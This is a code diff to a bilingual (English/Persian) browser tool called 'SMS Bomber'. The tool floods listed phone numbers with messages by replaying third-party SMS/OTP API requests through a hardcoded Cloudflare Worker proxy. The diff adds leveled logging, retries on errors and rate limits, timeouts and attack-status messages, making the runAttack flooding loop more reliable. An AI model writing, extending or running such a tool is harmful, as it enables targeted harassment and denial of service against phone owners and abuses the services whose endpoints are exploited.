@@ -15,6 +15,7 @@
             --green: #00ff41;
             --red: #ff3333;
             --yellow: #f59e0b;
+            --blue: #3b82f6;
             --radius: 16px;
             --font: 'Segoe UI', 'Vazir', Tahoma, sans-serif;
             --shadow: 0 0 25px rgba(0,255,65,0.2);
@@ -34,6 +35,7 @@
             --green: #0a0;
             --red: #c00;
             --yellow: #d97706;
+            --blue: #2563eb;
             --shadow: 0 0 15px rgba(0,0,0,0.1);
         }
         * { margin:0; padding:0; box-sizing:border-box; }
@@ -139,7 +141,7 @@
         .btn-stop:hover { transform: scale(1.03); }
         .btn-test { background: var(--yellow); color: #000; box-shadow: 0 0 15px var(--yellow); }
         .btn-test:hover { transform: scale(1.03); }
-        .btn-worker { background: #3b82f6; color: #fff; box-shadow: 0 0 15px #3b82f6; }
+        .btn-worker { background: var(--blue); color: #fff; box-shadow: 0 0 15px var(--blue); }
         .btn-worker:hover { transform: scale(1.03); }
         .btn-secondary { background: var(--glass); border: 1px solid var(--border); color: var(--text); }
         .tabs {
@@ -193,13 +195,19 @@
             border: 1px solid var(--border);
             border-radius: 12px;
             padding: 15px;
-            height: 220px;
+            height: 300px;
             overflow-y: auto;
             font-family: 'Courier New', monospace;
-            font-size: 0.85rem;
+            font-size: 0.8rem;
             backdrop-filter: blur(5px);
             white-space: pre-wrap;
         }
+        .log-entry { margin-bottom: 2px; }
+        .log-info { color: var(--text); }
+        .log-debug { color: #94a3b8; }
+        .log-success { color: var(--green); }
+        .log-warning { color: var(--yellow); }
+        .log-error { color: var(--red); }
         .chart-container {
             height: 300px;
             position: relative;
@@ -324,7 +332,7 @@
             </div>
 
             <div id="logPanel" style="display:block;">
-                <div class="log-box" id="logBox">⏳ Ready...</div>
+                <div class="log-box" id="logBox"></div>
             </div>
         </div>
     </div>
@@ -404,6 +412,11 @@
                 workerTestBtn: '🔌 Test Worker',
                 resetBtn: '↺ Reset',
                 logReady: '⏳ Ready...',
+                info: 'INFO',
+                debug: 'DEBUG',
+                success: 'SUCCESS',
+                warning: 'WARNING',
+                error: 'ERROR',
             },
             fa: {
                 title: '🕶️ ماتریکس اس‌ام‌اس بامبر اولترا',
@@ -418,6 +431,11 @@
                 workerTestBtn: '🔌 تست Worker',
                 resetBtn: '↺ بازنشانی',
                 logReady: '⏳ آماده...',
+                info: 'اطلاعات',
+                debug: 'اشکال‌زدایی',
+                success: 'موفق',
+                warning: 'هشدار',
+                error: 'خطا',
             }
         };
         function setLanguage(langCode) {
@@ -434,7 +452,8 @@
             document.getElementById('testBtn').innerText = t.testBtn;
             document.getElementById('workerTestBtn').innerText = t.workerTestBtn;
             document.querySelector('.btn-secondary').innerText = t.resetBtn;
-            document.getElementById('logBox').innerHTML = t.logReady;
+            document.getElementById('logBox').innerHTML = '';
+            log('info', t.logReady);
             if (langCode === 'fa') {
                 document.body.classList.add('rtl');
                 document.getElementById('langToggle').innerHTML = '🇬🇧 English';
@@ -469,6 +488,7 @@
         const openDB = indexedDB.open(DB_NAME, 1);
         openDB.onupgradeneeded = e => { db = e.target.result; db.createObjectStore(STORE_NAME, { keyPath: 'name' }); };
         openDB.onsuccess = e => { db = e.target.result; loadProfileList(); };
+        openDB.onerror = e => log('error', 'Failed to open database: ' + e.target.error);
 
         function loadProfileList() {
             const tx = db.transaction(STORE_NAME, 'readonly');
@@ -626,15 +646,21 @@
 
         // ==================== متغیرها ====================
         let stats = { total:0, success:0, fail:0 }, stopFlag = false, startTime = 0;
-        const DEFAULT_PROXY = 'https://smsbomber.game-developer-mb.workers.dev'; // ← جایگزین کنید
+        const DEFAULT_PROXY = 'https://smsbomber.game-developer-mb.workers.dev';
         document.getElementById('proxyUrl').value = localStorage.getItem('proxyUrl') || DEFAULT_PROXY;
         let chartInstance = null;
 
-        function log(msg) {
+        // ==================== توابع لاگ ====================
+        function log(level, msg) {
             const time = new Date().toLocaleTimeString(lang === 'fa' ? 'fa-IR' : 'en-US');
-            document.getElementById('logBox').innerHTML += `[${time}] ${msg}\n`;
+            const levelText = texts[lang][level] || level.toUpperCase();
+            const el = document.createElement('div');
+            el.className = `log-entry log-${level}`;
+            el.textContent = `[${time}] [${levelText}] ${msg}`;
+            document.getElementById('logBox').appendChild(el);
             document.getElementById('logBox').scrollTop = document.getElementById('logBox').scrollHeight;
         }
+
         function updateStats() {
             document.getElementById('total').innerText = stats.total;
             document.getElementById('success').innerText = stats.success;
@@ -654,34 +680,60 @@
                 chartInstance.update();
             }
         }
-        async function sendViaProxy(api, phone, proxyUrl) {
+
+        async function sendViaProxy(api, phone, proxyUrl, retry = 2) {
             const url = api.url.replace('{phone}', phone);
             const method = api.method || 'GET';
             let body = api.body ? api.body.replace('{phone}', phone) : null;
-            try {
-                const resp = await fetch(proxyUrl, {
-                    method:'POST',
-                    headers:{'Content-Type':'application/json'},
-                    body: JSON.stringify({url, method, headers:{'Content-Type':'application/json'}, body})
-                });
-                const status = resp.status;
-                const text = await resp.text();
-                let data;
+
+            for (let attempt = 0; attempt <= retry; attempt++) {
                 try {
-                    data = JSON.parse(text);
-                } catch {
-                    data = { raw: text.slice(0, 200) };
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 15000); // 15s timeout
+
+                    log('debug', `Attempt ${attempt + 1} → ${api.source} | ${method} ${url.substring(0, 80)}...`);
+                    const resp = await fetch(proxyUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ url, method, headers: { 'Content-Type': 'application/json' }, body }),
+                        signal: controller.signal
+                    });
+                    clearTimeout(timeoutId);
+
+                    const status = resp.status;
+                    const text = await resp.text();
+                    let data;
+                    try { data = JSON.parse(text); } catch { data = { raw: text.slice(0, 200) }; }
+
+                    if (resp.ok) {
+                        if (data.error) {
+                            log('warning', `${api.source} returned error: ${data.error}`);
+                            return { ok: false, status, message: data.error };
+                        }
+                        log('debug', `${api.source} status ${status} OK`);
+                        return { ok: true, status, message: '' };
+                    } else {
+                        log('warning', `${api.source} status ${status}: ${data.error || data.message || text.slice(0, 200)}`);
+                        // در صورت 5xx یا 429، تلاش مجدد
+                        if (attempt < retry && (status >= 500 || status === 429)) {
+                            log('debug', `Retrying ${api.source} (${attempt + 2}/${retry + 1})`);
+                            await new Promise(r => setTimeout(r, 1000));
+                            continue;
+                        }
+                        return { ok: false, status, message: data.error || data.message || text.slice(0, 200) };
+                    }
+                } catch (e) {
+                    log('error', `Network error on ${api.source}: ${e.name} - ${e.message}`);
+                    if (attempt < retry) {
+                        log('debug', `Retrying after network error (${attempt + 2}/${retry + 1})`);
+                        await new Promise(r => setTimeout(r, 1000));
+                        continue;
+                    }
+                    return { ok: false, status: 0, message: e.message };
                 }
-                if (resp.ok) {
-                    if (data.error) return { ok: false, status, message: data.error };
-                    return { ok: true, status, message: '' };
-                } else {
-                    return { ok: false, status, message: data.error || data.message || text.slice(0, 200) };
-                }
-            } catch (e) {
-                return { ok: false, status: 0, message: e.message };
             }
         }
+
         class TokenBucket {
             constructor(rate){ this.rate=rate; this.tokens=0; this.lastTime=Date.now(); }
             async consume(){
@@ -695,9 +747,11 @@
                 }
             }
         }
+
         async function runAttack(phone, rate, target, proxyUrl) {
             const bucket = new TokenBucket(rate);
             const tasks = [];
+            log('info', `Preparing task list for ${phone}...`);
             for (const api of API_TEMPLATES) {
                 if (stopFlag) break;
                 const cap = api.capacity || 0;
@@ -707,10 +761,18 @@
                     tasks.push(api);
                 }
             }
-            log(`📱 Sending to ${phone} | ${tasks.length} requests`);
+            log('debug', `Total tasks to send: ${tasks.length}`);
+            log('info', `Sending to ${phone} with rate ${rate} req/s...`);
+
+            let taskIndex = 0;
             for (const api of tasks) {
-                if (stopFlag || (target && stats.success >= target)) break;
+                if (stopFlag || (target && stats.success >= target)) {
+                    log('info', stopFlag ? 'Stopped by user.' : 'Target reached.');
+                    break;
+                }
                 await bucket.consume();
+                taskIndex++;
+                log('debug', `Request ${taskIndex}/${tasks.length} → ${api.source}`);
                 try {
                     const result = await sendViaProxy(api, phone, proxyUrl);
                     stats.total++;
@@ -719,9 +781,7 @@
                     } else {
                         stats.fail++;
                         if (result.status !== 0) {
-                            log(`❌ ${api.source} | Status: ${result.status} | ${result.message}`);
-                        } else {
-                            log(`⚠️ ${api.source} | Network error: ${result.message}`);
+                            log('warning', `Failed ${api.source} (status ${result.status}): ${result.message}`);
                         }
                     }
                     updateStats();
@@ -731,45 +791,49 @@
                     stats.total++;
                     stats.fail++;
                     updateStats();
-                    log(`⚠️ Exception in ${api.source}: ${e.message}`);
-                }
-                if (target && stats.success >= target) {
-                    log(`🎯 Target reached`);
-                    break;
+                    log('error', `Exception in request ${taskIndex}: ${e.message}`);
                 }
             }
+            log('info', `Finished sending to ${phone}. Total: ${stats.total}, Success: ${stats.success}, Failed: ${stats.fail}`);
         }
+
         async function processPhoneList(phones, rate, target, proxyUrl) {
             for (const phone of phones) {
                 if (stopFlag) break;
                 await runAttack(phone, rate, target ? Math.ceil(target / phones.length) : null, proxyUrl);
             }
-            log('🏁 All done');
+            log('info', 'All phone numbers processed.');
             if (Notification.permission === 'granted') new Notification('SMS Bomber', { body: 'Operation finished.' });
             document.getElementById('startBtn').disabled = false;
             document.getElementById('testBtn').disabled = false;
             document.getElementById('stopBtn').disabled = true;
             document.getElementById('progressBar').style.width = '100%';
         }
+
         function startAttack() {
+            log('info', 'Start button clicked.');
             const key = new URLSearchParams(window.location.search).get('key');
-            if (!key) { alert('Access key required in URL (?key=...)'); return; }
+            if (!key) { alert('Access key required in URL (?key=...)'); log('error', 'No access key provided.'); return; }
             const phonesText = document.getElementById('phonesInput').value.trim();
             const phones = phonesText ? phonesText.split(/[,\n]+/).map(p => p.trim()).filter(p => /^09\d{9}$/.test(p)) : [];
-            if (phones.length === 0) { alert('Enter at least one valid phone number'); return; }
+            if (phones.length === 0) { alert('Enter at least one valid phone number'); log('error', 'No valid phone numbers entered.'); return; }
             const rate = parseInt(document.getElementById('rateSlider').value);
             const target = parseInt(document.getElementById('target').value) || 0;
             const scheduler = parseInt(document.getElementById('scheduler').value) || 0;
             const useProxy = document.getElementById('useProxy').checked;
             const proxyUrl = useProxy ? document.getElementById('proxyUrl').value.trim() : null;
-            if (useProxy && !proxyUrl) { alert('Proxy URL required'); return; }
+            if (useProxy && !proxyUrl) { alert('Proxy URL required'); log('error', 'Proxy URL missing.'); return; }
             localStorage.setItem('proxyUrl', proxyUrl);
-            stats = { total: 0, success: 0, fail: 0 }; stopFlag = false; startTime = Date.now();
+
+            stats = { total:0, success:0, fail:0 }; stopFlag = false; startTime = Date.now();
             document.getElementById('logBox').innerHTML = '';
             document.getElementById('progressBar').style.width = '0%';
             document.getElementById('startBtn').disabled = true;
             document.getElementById('testBtn').disabled = true;
             document.getElementById('stopBtn').disabled = false;
+
+            log('info', `Starting attack on ${phones.length} number(s). Rate: ${rate} req/s, Target: ${target || 'unlimited'}, Proxy: ${proxyUrl || 'disabled'}`);
+
             if (chartInstance) chartInstance.destroy();
             const ctx = document.getElementById('liveChart').getContext('2d');
             chartInstance = new Chart(ctx, {
@@ -778,24 +842,27 @@
                 options: { animation: false, scales: { x: { display: false } } }
             });
             if ('Notification' in window) Notification.requestPermission();
+
             const go = () => processPhoneList(phones, rate, target, proxyUrl);
-            if (scheduler > 0) { log(`⏰ Scheduled start in ${scheduler}s`); setTimeout(go, scheduler * 1000); }
+            if (scheduler > 0) { log('info', `Scheduled start in ${scheduler} seconds.`); setTimeout(go, scheduler * 1000); }
             else go();
         }
+
         async function testAttack() {
+            log('info', 'Test button clicked.');
             const key = new URLSearchParams(window.location.search).get('key');
-            if (!key) { alert('Access key required in URL (?key=...)'); return; }
+            if (!key) { alert('Access key required in URL (?key=...)'); log('error', 'No access key provided.'); return; }
             const phonesText = document.getElementById('phonesInput').value.trim();
             const phones = phonesText ? phonesText.split(/[,\n]+/).map(p => p.trim()).filter(p => /^09\d{9}$/.test(p)) : [];
-            if (phones.length === 0) { alert('Enter at least one valid phone number'); return; }
+            if (phones.length === 0) { alert('Enter at least one valid phone number'); log('error', 'No valid phone numbers entered.'); return; }
             const testPhone = phones[0];
             const rate = parseInt(document.getElementById('rateSlider').value);
             const useProxy = document.getElementById('useProxy').checked;
             const proxyUrl = useProxy ? document.getElementById('proxyUrl').value.trim() : null;
-            if (useProxy && !proxyUrl) { alert('Proxy URL required'); return; }
+            if (useProxy && !proxyUrl) { alert('Proxy URL required'); log('error', 'Proxy URL missing.'); return; }
             localStorage.setItem('proxyUrl', proxyUrl);
 
-            stats = { total: 0, success: 0, fail: 0 };
+            stats = { total:0, success:0, fail:0 };
             stopFlag = false;
             startTime = Date.now();
             document.getElementById('logBox').innerHTML = '';
@@ -803,6 +870,9 @@
             document.getElementById('startBtn').disabled = true;
             document.getElementById('testBtn').disabled = true;
             document.getElementById('stopBtn').disabled = false;
+
+            log('info', `Test started: sending 10 requests to ${testPhone}`);
+
             if (chartInstance) chartInstance.destroy();
             const ctx = document.getElementById('liveChart').getContext('2d');
             chartInstance = new Chart(ctx, {
@@ -810,25 +880,29 @@
                 data: { labels: [], datasets: [{ label: 'Success', borderColor: 'green', data: [] }, { label: 'Fail', borderColor: 'red', data: [] }] },
                 options: { animation: false, scales: { x: { display: false } } }
             });
-            log(`🧪 Test started: sending 10 requests to ${testPhone}`);
-            // ابتدا تست Worker برای اطمینان
+
+            // ابتدا تست Worker
             await testWorker();
+
             // سپس ارسال ۱۰ درخواست
             await runAttack(testPhone, rate, 10, proxyUrl);
-            log('🏁 Test completed.');
+            log('info', 'Test completed.');
             document.getElementById('startBtn').disabled = false;
             document.getElementById('testBtn').disabled = false;
             document.getElementById('stopBtn').disabled = true;
         }
+
         async function testWorker() {
+            log('info', 'Testing Worker connection...');
             const proxyUrl = document.getElementById('proxyUrl').value.trim();
             if (!proxyUrl) {
-                log('❌ Proxy URL is empty');
+                log('error', 'Proxy URL is empty');
                 document.getElementById('workerStatus').innerText = '🔴 Worker: No URL';
                 return;
             }
-            log('🔌 Testing Worker connection...');
             try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 10000);
                 const resp = await fetch(proxyUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -837,32 +911,37 @@
                         method: 'GET',
                         headers: {},
                         body: null
-                    })
+                    }),
+                    signal: controller.signal
                 });
+                clearTimeout(timeoutId);
                 const status = resp.status;
                 const text = await resp.text();
-                log(`✅ Worker responded with status ${status}`);
+                log('debug', `Worker response status: ${status}`);
                 if (status === 200) {
-                    log(`📄 Response preview: ${text.slice(0, 200)}`);
+                    log('success', 'Worker is online.');
+                    log('debug', `Response preview: ${text.slice(0, 200)}`);
                     document.getElementById('workerStatus').innerText = '🟢 Worker: Online';
                 } else {
-                    log(`❌ Worker error: ${text.slice(0, 200)}`);
+                    log('error', `Worker returned status ${status}: ${text.slice(0, 200)}`);
                     document.getElementById('workerStatus').innerText = '🔴 Worker: Offline';
                 }
             } catch (e) {
-                log(`❌ Failed to connect to Worker: ${e.message}`);
-                log('💡 Check if the Worker URL is correct and CORS is enabled.');
+                log('error', `Failed to connect to Worker: ${e.name} - ${e.message}`);
+                log('warning', 'Check if the Worker URL is correct and CORS is enabled.');
                 document.getElementById('workerStatus').innerText = '🔴 Worker: Offline';
             }
         }
-        function stopAttack() { stopFlag = true; document.getElementById('stopBtn').disabled = true; }
+
+        function stopAttack() { stopFlag = true; log('info', 'Stop requested.'); document.getElementById('stopBtn').disabled = true; }
         function resetAll() {
             document.getElementById('phonesInput').value = '';
             document.getElementById('rateSlider').value = 5; document.getElementById('rateVal').innerText = '5';
             document.getElementById('target').value = '';
-            stats = { total: 0, success: 0, fail: 0 }; updateStats();
+            stats = { total:0, success:0, fail:0 }; updateStats();
             document.getElementById('progressBar').style.width = '0%';
-            document.getElementById('logBox').innerHTML = texts[lang].logReady;
+            document.getElementById('logBox').innerHTML = '';
+            log('info', texts[lang].logReady);
             if (chartInstance) { chartInstance.destroy(); chartInstance = null; }
             document.getElementById('startBtn').disabled = false;
             document.getElementById('testBtn').disabled = false;
@@ -871,7 +950,7 @@
             const file = document.getElementById('phonesFile').files[0];
             if (!file) return;
             const reader = new FileReader();
-            reader.onload = e => { document.getElementById('phonesInput').value = e.target.result; };
+            reader.onload = e => { document.getElementById('phonesInput').value = e.target.result; log('info', 'Phone file loaded.'); };
             reader.readAsText(file);
         }
         function switchTab(tab) {
@@ -882,9 +961,12 @@
             event.target.classList.add('active');
         }
         function showHelp() { document.getElementById('helpModal').style.display = 'flex'; }
-        // راه‌اندازی
+
+        // راه‌اندازی اولیه
+        log('info', 'Application initializing...');
         loadProfileList();
         updateStats();
+        log('success', 'Application ready.');
     </script>
 </body>
 </html>
